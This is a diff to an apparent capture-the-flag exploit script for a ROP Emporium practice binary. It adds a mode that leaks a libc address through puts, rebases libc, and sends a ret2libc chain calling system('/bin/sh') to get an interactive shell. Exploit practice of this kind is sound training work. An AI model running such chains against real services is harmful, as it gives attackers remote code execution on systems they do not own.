@@ -8,7 +8,7 @@ context.log_level = logging.INFO
 
 gdbscript = '''
 set follow-fork-mode parent
-break *pwnme
+break *pwnme+0x59
 continue
 '''
 
@@ -28,13 +28,32 @@ def make_call_chain(address):
 def main():
     rop = ROP(elf)
     rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
-    rop.raw([make_call_chain(a) for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]])
+    if args.SHELL:
+        rop.puts(elf.got.puts)
+        rop.main()
+    else:
+        rop.raw([make_call_chain(a) for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]])
     payload = rop.chain()
     assert len(payload) <= READ_SIZE
 
     c = connection()
     c.sendafter(b'> ', payload)
-    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())
+    if args.SHELL:
+        c.recvline()
+        puts = unpack(c.recvline(drop=True).ljust(context.bytes, b'\0'))
+        libc = elf.libc
+        libc.address = puts - libc.symbols.puts
+        rop = ROP(libc)
+        rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
+        rop.raw(rop.ret.address)
+        rop.system(next(libc.search(b'/bin/sh\0')))
+        payload = rop.chain()
+        assert len(payload) <= READ_SIZE
+        c.sendafter(b'> ', payload)
+        c.recvline()
+        c.interactive()
+    else:
+        print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())
 
 if __name__ == '__main__':
     main()
